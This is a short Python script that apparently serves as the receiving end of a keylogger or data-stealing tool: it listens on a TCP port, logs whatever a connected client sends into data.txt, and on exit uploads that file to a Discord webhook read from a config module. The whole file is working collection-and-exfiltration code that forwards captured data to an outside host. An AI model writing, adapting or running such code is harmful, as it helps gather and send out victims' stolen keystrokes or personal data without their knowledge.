import socket
from discohook.client import Discohook

# Server configuration
from info import *

# Create a TCP/IP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((IP, PORT))
server_socket.listen(1)

print('Server listening on {}:{}'.format(IP, PORT))

x = True

while True:
    try:
        # Accept a client connection
        client_conn, client_addr = server_socket.accept()

        if x == True:
            print('[+] Incoming connection from {client_addr[0]}:{client_addr[1]}')
            print('[i] Press CTRL+C to exit!')
            x = False

        data = client_conn.recv(1024).decode('utf-8')
        if not data:
            pass
        # ( ͡° ͜ʖ ͡°) 
        else:
            print(data)
            # write data to a text file
            with open('data.txt', 'a') as f:
                f.write(data)
                f.write('\n')
                f.close()
    except KeyboardInterrupt:
        print("( ͡° ͜ʖ ͡°)")
        hook = Discohook(url=WEBHOOK, username="Logs:")
        with open("data.txt", "rb") as f:
            hook.add_file(file=f.read(), filename='data.txt')
        response = hook.execute()

        break